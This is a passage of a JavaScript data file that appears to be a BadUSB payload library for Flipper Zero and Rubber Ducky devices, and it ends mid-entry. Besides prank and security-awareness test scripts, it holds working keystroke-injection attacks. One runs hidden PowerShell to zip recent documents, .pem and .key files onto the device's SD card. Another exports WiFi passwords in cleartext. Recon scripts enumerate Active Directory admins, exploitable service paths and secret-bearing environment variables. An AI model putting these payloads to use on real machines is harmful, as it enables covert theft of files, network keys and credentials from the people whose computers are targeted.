    description: 'Opens the classic Rick Astley video in the default browser. Uses Flipper-specific DEFAULT_DELAY for smooth execution.',
    targetOS: ['windows'],
    riskLevel: 'low',
    executionTime: '~3s',
    detectionDifficulty: 'easy',
    format: 'flipper',
    script: `REM Flipper Zero Rick Roll
DEFAULT_DELAY 100
DELAY 500
GUI r
DELAY 500
STRING https://www.youtube.com/watch?v=dQw4w9WgXcQ
ENTER`,
    notes: 'Classic. Simple. Effective.'
  },
  {
    id: 'flipper-fake-update',
    name: '[Flipper] Fake Windows Update Screen',
    category: 'pranks',
    description: 'Opens a full-screen fake Windows Update page in the browser. Uses REPEAT for key presses.',
    targetOS: ['windows'],
    riskLevel: 'low',
    executionTime: '~5s',
    detectionDifficulty: 'easy',
    format: 'flipper',
    script: `REM Flipper Zero Fake Windows Update
DEFAULT_DELAY 20
DELAY 500
GUI r
DELAY 500
STRING https://fakeupdate.net/win10u/
ENTER
DELAY 2000
REM Go fullscreen
F11
DELAY 500`,
    notes: 'Press F11 or Escape to exit fullscreen. Harmless prank.'
  },
  {
    id: 'flipper-wallpaper-change',
    name: '[Flipper] Desktop Wallpaper Changer',
    category: 'pranks',
    description: 'Downloads a funny image and sets it as the desktop wallpaper. Uses STRINGDELAY for reliable typing.',
    targetOS: ['windows'],
    riskLevel: 'low',
    executionTime: '~8s',
    detectionDifficulty: 'easy',
    format: 'flipper',
    script: `REM Flipper Zero Wallpaper Changer
DEFAULT_DELAY 20
STRINGDELAY 15
DELAY 1000
GUI r
DELAY 500
STRING powershell -WindowStyle Hidden
ENTER
DELAY 1000
STRING Invoke-WebRequest -Uri "https://i.imgur.com/example.jpg" -OutFile "$env:TEMP\\flipper_wp.jpg"; Add-Type -TypeDefinition 'using System;using System.Runtime.InteropServices;public class WP{[DllImport("user32.dll",CharSet=CharSet.Auto)]static extern int SystemParametersInfo(int a,int b,string c,int d);public static void Set(string p){SystemParametersInfo(20,0,p,3);}}'; [WP]::Set("$env:TEMP\\flipper_wp.jpg")
ENTER
DELAY 3000
STRING exit
ENTER`,
    notes: 'Replace image URL with desired wallpaper.'
  },
  {
    id: 'flipper-button-demo',
    name: '[Flipper] WAIT_FOR_BUTTON_PRESS Demo',
    category: 'pranks',
    description: 'Interactive demo showcasing WAIT_FOR_BUTTON_PRESS - opens notepad and types a message each time the Flipper button is pressed.',
    targetOS: ['windows'],
    riskLevel: 'low',
    executionTime: '~20s',
    detectionDifficulty: 'easy',
    format: 'flipper',
    script: `REM Flipper Zero Button Press Demo
REM Each section waits for a button press
DEFAULT_DELAY 50
GUI r
DELAY 500
STRING notepad
ENTER
DELAY 1000

REM First message
WAIT_FOR_BUTTON_PRESS
STRING === Flipper Zero BadUSB Demo ===
ENTER
STRING Press the Flipper button to continue...
ENTER
ENTER

REM Second message
WAIT_FOR_BUTTON_PRESS
STRING Step 1: I can type text on demand!
ENTER
STRING Each section waits for YOUR button press.
ENTER
ENTER

REM Third message
WAIT_FOR_BUTTON_PRESS
STRING Step 2: This gives you precise timing control.
ENTER
STRING No more hoping the script runs at the right moment.
ENTER
ENTER

REM Final message
WAIT_FOR_BUTTON_PRESS
STRING Step 3: Demo complete! This is the power of Flipper Zero BadUSB.
ENTER
STRING Interactive payloads > timed payloads
ENTER`,
    notes: 'Great for demonstrations. Each section is triggered by pressing the Flipper button.'
  },
  {
    id: 'flipper-win-exfil-compress',
    name: '[Flipper] Windows Compressed Exfil',
    category: 'exfiltration',
    description: 'Compresses documents, downloads, and desktop files into a ZIP and stages for Flipper SD retrieval.',
    targetOS: ['windows'],
    riskLevel: 'high',
    executionTime: '~20s',
    detectionDifficulty: 'moderate',
    format: 'flipper',
    script: `REM Flipper Zero Compressed Exfiltration
DEFAULT_DELAY 20
WAIT_FOR_BUTTON_PRESS
GUI r
DELAY 500
STRING powershell -WindowStyle Hidden
ENTER
DELAY 1000
STRING $staging = "$env:TEMP\\fz_exfil"; New-Item -ItemType Directory -Force -Path $staging | Out-Null; $exts = @("*.doc","*.docx","*.pdf","*.xlsx","*.txt","*.csv","*.pptx","*.key","*.pem","*.conf","*.cfg"); foreach($ext in $exts){ Get-ChildItem -Path "$env:USERPROFILE\\Desktop","$env:USERPROFILE\\Documents","$env:USERPROFILE\\Downloads" -Filter $ext -Recurse -ErrorAction SilentlyContinue | Where-Object { $_.Length -lt 5MB -and $_.LastWriteTime -gt (Get-Date).AddDays(-14) } | ForEach-Object { Copy-Item $_.FullName "$staging\\$($_.Name)" -Force }}; Compress-Archive -Path "$staging\\*" -DestinationPath "$env:TEMP\\loot.zip" -Force; $drv = (Get-Volume | Where-Object { $_.FileSystemLabel -eq 'Flipper SD' }).DriveLetter; if($drv){ Copy-Item "$env:TEMP\\loot.zip" "$($drv):\\loot\\exfil.zip" -Force }
ENTER
DELAY 10000
STRING exit
ENTER`,
    notes: 'Collects files < 5MB modified in last 14 days. Saves to Flipper SD if available.'
  },
  {
    id: 'flipper-win-wifi-evil-twin',
    name: '[Flipper] WiFi Evil Twin Prep',
    category: 'network',
    description: 'Gathers WiFi network details to prepare for an evil twin attack. Exports profiles and connection info.',
    targetOS: ['windows'],
    riskLevel: 'medium',
    executionTime: '~8s',
    detectionDifficulty: 'moderate',
    format: 'flipper',
    script: `REM Flipper Zero WiFi Evil Twin Preparation
DEFAULT_DELAY 20
DELAY 1000
GUI r
DELAY 500
STRING cmd /k
ENTER
DELAY 800
STRING netsh wlan show profiles > %TEMP%\\wifi_profiles.txt
ENTER
DELAY 1000
STRING netsh wlan show interfaces >> %TEMP%\\wifi_profiles.txt
ENTER
DELAY 500
STRING netsh wlan export profile key=clear folder=%TEMP%\\wifi_export
ENTER
DELAY 2000
STRING exit
ENTER`
  },

  // ==================== TEST (Safe/Fun Payloads) ====================
  {
    id: 'test-rickroll',
    name: 'Rick Roll',
    category: 'test',
    description: 'Opens the classic Never Gonna Give You Up video in the default browser. Safe test payload - no system changes.',
    targetOS: ['windows'],
    riskLevel: 'low',
    executionTime: '~3s',
    detectionDifficulty: 'easy',
    format: 'ducky',
    flipperCompat: true,
    script: `REM Rick Roll - Safe Test Payload
REM Opens Never Gonna Give You Up
DELAY 1000
GUI r
DELAY 500
STRING https://www.youtube.com/watch?v=dQw4w9WgXcQ
ENTER`
  },
  {
    id: 'test-rickroll-flipper',
    name: 'Rick Roll (Flipper)',
    category: 'test',
    description: 'Flipper Zero version - Opens the classic Rick Roll video. Safe test payload - no system changes.',
    targetOS: ['windows'],
    riskLevel: 'low',
    executionTime: '~3s',
    detectionDifficulty: 'easy',
    format: 'flipper',
    flipperCompat: true,
    script: `REM Rick Roll - Safe Test Payload (Flipper)
DEFAULT_DELAY 20
WAIT_FOR_BUTTON_PRESS
DELAY 1000
GUI r
DELAY 500
STRING https://www.youtube.com/watch?v=dQw4w9WgXcQ
ENTER`
  },
  {
    id: 'test-amongus',
    name: 'Among Us Twerking',
    category: 'test',
    description: 'Opens the Among Us twerking meme video. Safe test payload - no system changes.',
    targetOS: ['windows'],
    riskLevel: 'low',
    executionTime: '~3s',
    detectionDifficulty: 'easy',
    format: 'ducky',
    flipperCompat: true,
    script: `REM Among Us Twerking - Safe Test
DELAY 1000
GUI r
DELAY 500
STRING https://www.youtube.com/watch?v=hBe0LIB_Bxg
ENTER`
  },
  {
    id: 'test-amongus-flipper',
    name: 'Among Us Twerking (Flipper)',
    category: 'test',
    description: 'Flipper Zero version - Opens the Among Us twerking meme. Safe test payload - no system changes.',
    targetOS: ['windows'],
    riskLevel: 'low',
    executionTime: '~3s',
    detectionDifficulty: 'easy',
    format: 'flipper',
    flipperCompat: true,
    script: `REM Among Us Twerking - Safe Test (Flipper)
DEFAULT_DELAY 20
WAIT_FOR_BUTTON_PRESS
DELAY 1000
GUI r
DELAY 500
STRING https://www.youtube.com/watch?v=hBe0LIB_Bxg
ENTER`
  },
  {
    id: 'test-notepad-message',
    name: 'Desktop Notepad Message',
    category: 'test',
    description: 'Opens Notepad and types a funny security awareness message. Safe test payload - no system changes.',
    targetOS: ['windows'],
    riskLevel: 'low',
    executionTime: '~8s',
    detectionDifficulty: 'easy',
    format: 'ducky',
    flipperCompat: true,
    script: `REM Notepad Surprise - Safe Test
DELAY 1000
GUI r
DELAY 500
STRING notepad
ENTER
DELAY 800
STRING ========================================
ENTER
STRING   YOUR COMPUTER HAS BEEN HACKED!
ENTER
STRING          (just kidding)
ENTER
STRING ========================================
ENTER
ENTER
STRING   This was a security awareness demo.
ENTER
STRING   Your IT team wants you to know:
ENTER
STRING   - Never plug in unknown USB devices
ENTER
STRING   - Always lock your workstation
ENTER
STRING   - Report suspicious devices to IT
ENTER
ENTER
STRING   Stay safe out there!
ENTER
STRING   - The GOAT Security Team`
  },
  {
    id: 'test-notepad-message-flipper',
    name: 'Desktop Notepad Message (Flipper)',
    category: 'test',
    description: 'Flipper Zero version - Opens Notepad with a security awareness message. Safe test payload - no system changes.',
    targetOS: ['windows'],
    riskLevel: 'low',
    executionTime: '~10s',
    detectionDifficulty: 'easy',
    format: 'flipper',
    flipperCompat: true,
    script: `REM Notepad Surprise - Safe Test (Flipper)
DEFAULT_DELAY 20
WAIT_FOR_BUTTON_PRESS
DELAY 1000
GUI r
DELAY 500
STRING notepad
ENTER
DELAY 800
STRING ========================================
ENTER
STRING   YOUR COMPUTER HAS BEEN HACKED!
ENTER
STRING          (just kidding)
ENTER
STRING ========================================
ENTER
ENTER
STRING   This was a security awareness demo.
ENTER
STRING   Your IT team wants you to know:
ENTER
STRING   - Never plug in unknown USB devices
ENTER
STRING   - Always lock your workstation
ENTER
STRING   - Report suspicious devices to IT
ENTER
ENTER
STRING   Stay safe out there!
ENTER
STRING   - The GOAT Security Team`
  },
  {
    id: 'test-voice-tts',
    name: 'Voice Message (Windows TTS)',
    category: 'test',
    description: 'Uses Windows text-to-speech to speak a funny security awareness message. Safe test payload - no system changes.',
    targetOS: ['windows'],
    riskLevel: 'low',
    executionTime: '~12s',
    detectionDifficulty: 'easy',
    format: 'ducky',
    flipperCompat: true,
    script: `REM Text-to-Speech Surprise - Safe Test
DELAY 1000
GUI r
DELAY 500
STRING powershell -Command "Add-Type -AssemblyName System.Speech; (New-Object System.Speech.Synthesis.SpeechSynthesizer).Speak('Attention. Your computer has been compromised. Just kidding. But you should really lock your workstation when you walk away. Have a nice day.')"
ENTER`
  },
  {
    id: 'test-voice-tts-flipper',
    name: 'Voice Message (Flipper)',
    category: 'test',
    description: 'Flipper Zero version - Makes the computer speak a security awareness message via TTS. Safe test payload - no system changes.',
    targetOS: ['windows'],
    riskLevel: 'low',
    executionTime: '~12s',
    detectionDifficulty: 'easy',
    format: 'flipper',
    flipperCompat: true,
    script: `REM Text-to-Speech Surprise - Safe Test (Flipper)
DEFAULT_DELAY 20
WAIT_FOR_BUTTON_PRESS
DELAY 1000
GUI r
DELAY 500
STRING powershell -Command "Add-Type -AssemblyName System.Speech; (New-Object System.Speech.Synthesis.SpeechSynthesizer).Speak('Attention. Your computer has been compromised. Just kidding. But you should really lock your workstation when you walk away. Have a nice day.')"
ENTER`
  },
  {
    id: 'test-wallpaper-prank',
    name: 'Wallpaper Prank (Frozen Desktop)',
    category: 'test',
    description: 'Takes a screenshot and sets it as the wallpaper so everything looks normal but nothing is clickable. Safe test payload - no system changes.',
    targetOS: ['windows'],
    riskLevel: 'low',
    executionTime: '~5s',
    detectionDifficulty: 'easy',
    format: 'ducky',
    flipperCompat: true,
    script: `REM Frozen Desktop Prank - Safe Test
REM Takes screenshot, sets as wallpaper, hides icons
DELAY 1000
GUI r
DELAY 500
STRING powershell -WindowStyle Hidden -Command "$screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds; $bitmap = New-Object System.Drawing.Bitmap($screen.Width, $screen.Height); $graphics = [System.Drawing.Graphics]::FromImage($bitmap); $graphics.CopyFromScreen($screen.Location, [System.Drawing.Point]::Empty, $screen.Size); $bitmap.Save(\\"$env:TEMP\\\\frozen.bmp\\"); Add-Type -TypeDefinition 'using System.Runtime.InteropServices; public class Wallpaper { [DllImport(\\"user32.dll\\")] public static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni); }'; [Wallpaper]::SystemParametersInfo(20, 0, \\"$env:TEMP\\\\frozen.bmp\\", 3)"
ENTER`
  },
  {
    id: 'test-matrix-rain',
    name: 'Matrix Rain',
    category: 'test',
    description: 'Opens PowerShell with green Matrix-style falling characters animation. Safe test payload - no system changes.',
    targetOS: ['windows'],
    riskLevel: 'low',
    executionTime: '~4s',
    detectionDifficulty: 'easy',
    format: 'ducky',
    flipperCompat: true,
    script: `REM Matrix Rain - Safe Test
DELAY 1000
GUI r
DELAY 500
STRING powershell
ENTER
DELAY 800
STRING $host.UI.RawUI.BackgroundColor='Black';$host.UI.RawUI.ForegroundColor='Green';Clear-Host;$w=$host.UI.RawUI.WindowSize.Width;while($true){$r='';1..$w|%{$r+=if((Get-Random -Max 2)){[char](Get-Random -Min 33 -Max 126)}else{' '}};Write-Host $r -NoNewline;Start-Sleep -Milliseconds 50}
ENTER`
  },
  {
    id: 'test-matrix-rain-flipper',
    name: 'Matrix Rain (Flipper)',
    category: 'test',
    description: 'Flipper Zero version - Green Matrix-style falling characters in PowerShell. Safe test payload - no system changes.',
    targetOS: ['windows'],
    riskLevel: 'low',
    executionTime: '~5s',
    detectionDifficulty: 'easy',
    format: 'flipper',
    flipperCompat: true,
    script: `REM Matrix Rain - Safe Test (Flipper)
DEFAULT_DELAY 20
WAIT_FOR_BUTTON_PRESS
DELAY 1000
GUI r
DELAY 500
STRING powershell
ENTER
DELAY 800
STRING $host.UI.RawUI.BackgroundColor='Black';$host.UI.RawUI.ForegroundColor='Green';Clear-Host;$w=$host.UI.RawUI.WindowSize.Width;while($true){$r='';1..$w|%{$r+=if((Get-Random -Max 2)){[char](Get-Random -Min 33 -Max 126)}else{' '}};Write-Host $r -NoNewline;Start-Sleep -Milliseconds 50}
ENTER`
  },
  {
    id: 'test-fake-update',
    name: 'Fake Windows Update',
    category: 'test',
    description: 'Opens a full-screen fake Windows Update screen in the browser. Press F11 or Esc to exit. Safe test payload - no system changes.',
    targetOS: ['windows'],
    riskLevel: 'low',
    executionTime: '~5s',
    detectionDifficulty: 'easy',
    format: 'ducky',
    flipperCompat: true,
    script: `REM Fake Windows Update - Safe Test
DELAY 1000
GUI r
DELAY 500
STRING https://fakeupdate.net/win10ue/
ENTER
DELAY 2000
F11`
  },
  {
    id: 'test-mouse-jiggler',
    name: 'Mouse Jiggler',
    category: 'test',
    description: 'Moves the mouse by 1 pixel every 30 seconds to prevent screen lock. Close PowerShell to stop. Safe test payload - no system changes.',
    targetOS: ['windows'],
    riskLevel: 'low',
    executionTime: '~3s',
    detectionDifficulty: 'easy',
    format: 'ducky',
    flipperCompat: true,
    script: `REM Mouse Jiggler - Safe Test
REM Prevents screen lock by jiggling mouse
DELAY 1000
GUI r
DELAY 500
STRING powershell -WindowStyle Hidden -Command "Add-Type -AssemblyName System.Windows.Forms; while($true){[System.Windows.Forms.Cursor]::Position = New-Object System.Drawing.Point((([System.Windows.Forms.Cursor]::Position.X)+1),([System.Windows.Forms.Cursor]::Position.Y)); Start-Sleep -Milliseconds 30000; [System.Windows.Forms.Cursor]::Position = New-Object System.Drawing.Point((([System.Windows.Forms.Cursor]::Position.X)-1),([System.Windows.Forms.Cursor]::Position.Y)); Start-Sleep -Milliseconds 30000}"
ENTER`
  },
  {
    id: 'test-capslock-rave',
    name: 'Caps Lock Rave',
    category: 'test',
    description: 'Toggles Caps Lock rapidly 100 times making the keyboard LED flash like a rave. Safe test payload - no system changes.',
    targetOS: ['windows'],
    riskLevel: 'low',
    executionTime: '~12s',
    detectionDifficulty: 'easy',
    format: 'ducky',
    flipperCompat: true,
    script: `REM Caps Lock Rave - Safe Test
DELAY 1000
GUI r
DELAY 500
STRING powershell -Command "Add-Type -AssemblyName System.Windows.Forms; 1..100 | ForEach-Object { [System.Windows.Forms.SendKeys]::SendWait('{CAPSLOCK}'); Start-Sleep -Milliseconds 100 }"
ENTER`
  },
  {
    id: 'test-icon-shuffle',
    name: 'Desktop Icon Shuffle',
    category: 'test',
    description: 'Pops up a funny message claiming desktop icons were shuffled (they were not). Safe test payload - no system changes.',
    targetOS: ['windows'],
    riskLevel: 'low',
    executionTime: '~3s',
    detectionDifficulty: 'easy',
    format: 'ducky',
    flipperCompat: true,
    script: `REM Icon Shuffle - Safe Test
REM Just opens a funny message, doesn't actually move icons
DELAY 1000
GUI r
DELAY 500
STRING mshta "javascript:var sh=new ActiveXObject('WScript.Shell');sh.Popup('Your desktop icons have been shuffled!\\n\\n(Not really, but imagine if they were)\\n\\nLock your workstation next time!',10,'Security Awareness',48);close()"
ENTER`
  },

  // ==================== RECON — PROFESSIONAL PENTEST ====================
  {
    id: 'recon-full-network',
    name: 'Full Network Reconnaissance',
    category: 'recon',
    description: 'Comprehensive network recon: ipconfig, ARP table, routing, netstat, DNS cache. Timestamped output saved to temp folder.',
    targetOS: ['windows'],
    riskLevel: 'low',
    executionTime: '~15s',
    detectionDifficulty: 'easy',
    format: 'ducky',
    flipperCompat: true,
    script: `REM Full Network Reconnaissance
REM Gathers ipconfig, ARP, routes, netstat, DNS cache
DELAY 1000
GUI r
DELAY 500
STRING powershell -WindowStyle Hidden
ENTER
DELAY 1000
STRING $out = "$env:TEMP\\recon_$(Get-Date -Format 'yyyyMMdd_HHmmss').txt"; "=== SYSTEM ===" | Out-File $out; systeminfo | Out-File $out -Append; "=== NETWORK ===" | Out-File $out -Append; ipconfig /all | Out-File $out -Append; "=== ARP ===" | Out-File $out -Append; arp -a | Out-File $out -Append; "=== ROUTES ===" | Out-File $out -Append; route print | Out-File $out -Append; "=== NETSTAT ===" | Out-File $out -Append; netstat -ano | Out-File $out -Append; "=== DNS CACHE ===" | Out-File $out -Append; ipconfig /displaydns | Out-File $out -Append; Invoke-Item $out
ENTER`
  },
  {
    id: 'recon-ad-enum',
    name: 'Active Directory Enumeration',
    category: 'recon',
    description: 'Enumerates Active Directory domain info: domain controllers, users, groups, Domain Admins membership, and trust relationships. Requires domain-joined machine.',
    targetOS: ['windows'],
    riskLevel: 'medium',
    executionTime: '~20s',
    detectionDifficulty: 'moderate',
    format: 'ducky',
    flipperCompat: true,
    script: `REM AD Enumeration - requires domain-joined machine
DELAY 1000
GUI r
DELAY 500
STRING powershell -WindowStyle Hidden
ENTER
DELAY 1000
STRING $out = "$env:TEMP\\ad_enum.txt"; "=== DOMAIN INFO ===" | Out-File $out; try { nltest /dsgetdc: | Out-File $out -Append } catch { "nltest failed" | Out-File $out -Append }; "=== CURRENT USER ===" | Out-File $out -Append; whoami /all | Out-File $out -Append; "=== DOMAIN USERS ===" | Out-File $out -Append; try { net user /domain | Out-File $out -Append } catch { "Not domain joined" | Out-File $out -Append }; "=== DOMAIN GROUPS ===" | Out-File $out -Append; try { net group /domain | Out-File $out -Append } catch { "Failed" | Out-File $out -Append }; "=== DOMAIN ADMINS ===" | Out-File $out -Append; try { net group "Domain Admins" /domain | Out-File $out -Append } catch { "Failed" | Out-File $out -Append }; "=== TRUSTS ===" | Out-File $out -Append; try { nltest /domain_trusts | Out-File $out -Append } catch { "Failed" | Out-File $out -Append }; Invoke-Item $out
ENTER`
  },
  {
    id: 'recon-installed-software-full',
    name: 'Full Installed Software Inventory',
    category: 'recon',
    description: 'Enumerates all installed software from both 32-bit and 64-bit registry hives plus Windows Store apps. Includes version, publisher, install date, and install location.',
    targetOS: ['windows'],
    riskLevel: 'low',
    executionTime: '~10s',
    detectionDifficulty: 'easy',
    format: 'ducky',
    flipperCompat: true,
    script: `REM Full Installed Software Inventory
DELAY 1000
GUI r
DELAY 500
STRING powershell -WindowStyle Hidden
ENTER
DELAY 1000
STRING $out = "$env:TEMP\\software_inventory.txt"; "=== 64-BIT SOFTWARE ===" | Out-File $out; Get-ItemProperty HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\* | Select-Object DisplayName, DisplayVersion, Publisher, InstallDate, InstallLocation | Where-Object { $_.DisplayName } | Sort-Object DisplayName | Format-Table -AutoSize | Out-String -Width 200 | Out-File $out -Append; "=== 32-BIT SOFTWARE ===" | Out-File $out -Append; Get-ItemProperty HKLM:\\Software\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\* | Select-Object DisplayName, DisplayVersion, Publisher, InstallDate | Where-Object { $_.DisplayName } | Sort-Object DisplayName | Format-Table -AutoSize | Out-String -Width 200 | Out-File $out -Append; "=== WINDOWS STORE APPS ===" | Out-File $out -Append; Get-AppxPackage | Select-Object Name, Version, Publisher | Format-Table -AutoSize | Out-String -Width 200 | Out-File $out -Append; Invoke-Item $out
ENTER`
  },
  {
    id: 'recon-process-dump',
    name: 'Running Processes Deep Dump',
    category: 'recon',
    description: 'Dumps all running processes with PID, parent PID, executable path, owner, command line, and memory usage. Useful for identifying security software and attack surface.',
    targetOS: ['windows'],
    riskLevel: 'low',
    executionTime: '~8s',
    detectionDifficulty: 'easy',
    format: 'ducky',
    flipperCompat: true,
    script: `REM Running Processes Deep Dump
DELAY 1000
GUI r
DELAY 500
STRING powershell -WindowStyle Hidden
ENTER
DELAY 1000
STRING $out = "$env:TEMP\\processes.txt"; "=== RUNNING PROCESSES ===" | Out-File $out; Get-WmiObject Win32_Process | Select-Object ProcessId, ParentProcessId, Name, ExecutablePath, CommandLine, @{N='Owner';E={$_.GetOwner().User}}, @{N='MemMB';E={[math]::Round($_.WorkingSetSize/1MB,2)}} | Sort-Object Name | Format-List | Out-String -Width 300 | Out-File $out -Append; "=== PROCESS TREE ===" | Out-File $out -Append; Get-CimInstance Win32_Process | Select-Object ProcessId, ParentProcessId, Name | Format-Table -AutoSize | Out-String -Width 200 | Out-File $out -Append; Invoke-Item $out
ENTER`
  },
  {
    id: 'recon-scheduled-tasks',
    name: 'Scheduled Tasks Dump',
    category: 'recon',
    description: 'Enumerates all scheduled tasks with their triggers, actions, run-as accounts, and status. Identifies potential persistence mechanisms and attack surface.',
    targetOS: ['windows'],
    riskLevel: 'low',
    executionTime: '~12s',
    detectionDifficulty: 'easy',
    format: 'ducky',
    flipperCompat: true,
    script: `REM Scheduled Tasks Full Dump
DELAY 1000
GUI r
DELAY 500
STRING powershell -WindowStyle Hidden
ENTER
DELAY 1000
STRING $out = "$env:TEMP\\schtasks.txt"; "=== ALL SCHEDULED TASKS ===" | Out-File $out; Get-ScheduledTask | ForEach-Object { $task = $_; $info = $_ | Get-ScheduledTaskInfo -ErrorAction SilentlyContinue; [PSCustomObject]@{ Name=$task.TaskName; Path=$task.TaskPath; State=$task.State; Author=$task.Author; RunAs=$task.Principal.UserId; Actions=($task.Actions | ForEach-Object { $_.Execute + ' ' + $_.Arguments }) -join '; '; Triggers=($task.Triggers | ForEach-Object { $_.ToString() }) -join '; '; LastRun=$info.LastRunTime; NextRun=$info.NextRunTime } } | Format-List | Out-String -Width 300 | Out-File $out -Append; Invoke-Item $out
ENTER`
  },
  {
    id: 'recon-services-enum',
    name: 'Windows Services Enumeration',
    category: 'recon',
    description: 'Enumerates all Windows services including state, start type, binary path, and service account. Identifies services running as SYSTEM and those with unquoted paths.',
    targetOS: ['windows'],
    riskLevel: 'low',
    executionTime: '~8s',
    detectionDifficulty: 'easy',
    format: 'ducky',
    flipperCompat: true,
    script: `REM Windows Services Enumeration
DELAY 1000
GUI r
DELAY 500
STRING powershell -WindowStyle Hidden
ENTER
DELAY 1000
STRING $out = "$env:TEMP\\services.txt"; "=== ALL SERVICES ===" | Out-File $out; Get-WmiObject Win32_Service | Select-Object Name, DisplayName, State, StartMode, PathName, StartName | Sort-Object State, Name | Format-Table -AutoSize | Out-String -Width 300 | Out-File $out -Append; "=== UNQUOTED SERVICE PATHS ===" | Out-File $out -Append; Get-WmiObject Win32_Service | Where-Object { $_.PathName -notlike '"*' -and $_.PathName -like '* *' -and $_.PathName -notlike 'C:\\Windows\\*' } | Select-Object Name, PathName, StartName | Format-Table -AutoSize | Out-String -Width 300 | Out-File $out -Append; "=== SERVICES RUNNING AS SYSTEM ===" | Out-File $out -Append; Get-WmiObject Win32_Service | Where-Object { $_.StartName -eq 'LocalSystem' -and $_.State -eq 'Running' } | Select-Object Name, PathName | Format-Table -AutoSize | Out-String -Width 300 | Out-File $out -Append; Invoke-Item $out
ENTER`
  },
  {
    id: 'recon-firewall-rules',
    name: 'Firewall Rules Export',
    category: 'recon',
    description: 'Exports all Windows Firewall rules including direction, action, port, protocol, and remote address. Identifies gaps in firewall coverage.',
    targetOS: ['windows'],
    riskLevel: 'low',
    executionTime: '~10s',
    detectionDifficulty: 'easy',
    format: 'ducky',
    flipperCompat: true,
    script: `REM Firewall Rules Export
DELAY 1000
GUI r
DELAY 500
STRING powershell -WindowStyle Hidden
ENTER
DELAY 1000
STRING $out = "$env:TEMP\\firewall_rules.txt"; "=== FIREWALL PROFILES ===" | Out-File $out; Get-NetFirewallProfile | Select-Object Name, Enabled, DefaultInboundAction, DefaultOutboundAction | Format-Table -AutoSize | Out-String -Width 200 | Out-File $out -Append; "=== INBOUND ALLOW RULES ===" | Out-File $out -Append; Get-NetFirewallRule -Direction Inbound -Action Allow -Enabled True | Select-Object DisplayName, Profile, @{N='Port';E={(Get-NetFirewallPortFilter -AssociatedNetFirewallRule $_).LocalPort}}, @{N='Protocol';E={(Get-NetFirewallPortFilter -AssociatedNetFirewallRule $_).Protocol}} | Format-Table -AutoSize | Out-String -Width 200 | Out-File $out -Append; "=== OUTBOUND BLOCK RULES ===" | Out-File $out -Append; Get-NetFirewallRule -Direction Outbound -Action Block -Enabled True | Select-Object DisplayName, Profile | Format-Table -AutoSize | Out-String -Width 200 | Out-File $out -Append; Invoke-Item $out
ENTER`
  },
  {
    id: 'recon-env-vars',
    name: 'Environment Variables Dump',
    category: 'recon',
    description: 'Dumps all environment variables including PATH, potential credential leaks in variables like API_KEY, TOKEN, SECRET, PASSWORD. Checks both user and system scope.',
    targetOS: ['windows'],
    riskLevel: 'low',
    executionTime: '~5s',
    detectionDifficulty: 'easy',
    format: 'ducky',
    flipperCompat: true,
    script: `REM Environment Variables Dump
DELAY 1000
GUI r
DELAY 500
STRING powershell -WindowStyle Hidden
ENTER
DELAY 1000
STRING $out = "$env:TEMP\\env_vars.txt"; "=== ALL ENVIRONMENT VARIABLES ===" | Out-File $out; Get-ChildItem Env: | Sort-Object Name | Format-Table -AutoSize | Out-String -Width 300 | Out-File $out -Append; "=== PATH ENTRIES ===" | Out-File $out -Append; $env:PATH -split ';' | ForEach-Object { $p = $_; [PSCustomObject]@{Path=$p; Exists=(Test-Path $p); Writable=try{$t="$p\\test.tmp";[IO.File]::Create($t).Close();Remove-Item $t;$true}catch{$false}} } | Format-Table -AutoSize | Out-String -Width 200 | Out-File $out -Append; "=== POTENTIAL CREDENTIAL VARS ===" | Out-File $out -Append; Get-ChildItem Env: | Where-Object { $_.Name -match 'key|token|secret|pass|cred|api|auth' } | Format-Table -AutoSize | Out-String -Width 300 | Out-File $out -Append; Invoke-Item $out
ENTER`
  },
  {
    id: 'recon-shares-drives',
    name: 'Shared Folders & Mapped Drives',
    category: 'recon',
    description: 'Enumerates local shares, mapped network drives, and accessible network shares. Tests connectivity to discovered shares.',
    targetOS: ['windows'],
    riskLevel: 'low',
    executionTime: '~12s',
    detectionDifficulty: 'easy',
    format: 'ducky',
    flipperCompat: true,
    script: `REM Shared Folders & Mapped Drives Recon
DELAY 1000
GUI r
DELAY 500
STRING powershell -WindowStyle Hidden
ENTER
DELAY 1000
STRING $out = "$env:TEMP\\shares.txt"; "=== LOCAL SHARES ===" | Out-File $out; net share | Out-File $out -Append; "=== MAPPED DRIVES ===" | Out-File $out -Append; Get-PSDrive -PSProvider FileSystem | Select-Object Name, Root, Used, Free, @{N='UsedGB';E={[math]::Round($_.Used/1GB,2)}}, @{N='FreeGB';E={[math]::Round($_.Free/1GB,2)}} | Format-Table -AutoSize | Out-String -Width 200 | Out-File $out -Append; "=== NET USE ===" | Out-File $out -Append; net use | Out-File $out -Append; "=== SMB SHARES ON LOCAL ===" | Out-File $out -Append; Get-SmbShare -ErrorAction SilentlyContinue | Select-Object Name, Path, Description | Format-Table -AutoSize | Out-String -Width 200 | Out-File $out -Append; "=== RECENT NETWORK CONNECTIONS ===" | Out-File $out -Append; Get-ItemProperty 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\MountPoints2\\*' -ErrorAction SilentlyContinue | Select-Object PSChildName | Format-Table | Out-String | Out-File $out -Append; Invoke-Item $out
ENTER`
  },
  {
    id: 'recon-security-policy',
    name: 'Security Policy Dump',
    category: 'recon',
    description: 'Dumps local security policies: password policy, account lockout settings, audit policies, user rights assignments, and security options.',
    targetOS: ['windows'],
    riskLevel: 'low',
    executionTime: '~10s',
    detectionDifficulty: 'moderate',
    format: 'ducky',
    flipperCompat: true,
    script: `REM Security Policy Dump
DELAY 1000
GUI r
DELAY 500
STRING powershell -WindowStyle Hidden
ENTER
DELAY 1000
